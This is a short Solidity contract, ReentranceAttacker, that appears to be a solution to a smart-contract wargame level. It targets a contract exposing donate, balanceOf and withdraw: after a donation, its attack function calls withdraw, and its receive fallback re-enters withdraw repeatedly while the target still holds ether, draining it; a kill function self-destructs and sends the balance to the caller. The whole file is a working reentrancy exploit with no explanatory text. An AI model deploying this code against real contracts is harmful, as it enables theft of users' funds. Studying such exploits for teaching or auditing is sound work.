// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address) external payable;

    function balanceOf(address) external view returns (uint256);

    function withdraw(uint256) external;
}

contract ReentranceAttacker {
    IReentrance target;

    constructor(address _targetAddress) {
        target = IReentrance(_targetAddress);
    }

    function donate() public payable {
        target.donate{value: msg.value}(address(this));
    }

    function attack() public {
        uint256 balance = target.balanceOf(address(this));
        target.withdraw(balance);
    }

    function kill() public {
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        if (address(target).balance > 0) {
            uint256 balance = target.balanceOf(address(this));
            target.withdraw(balance);
        }
    }
}
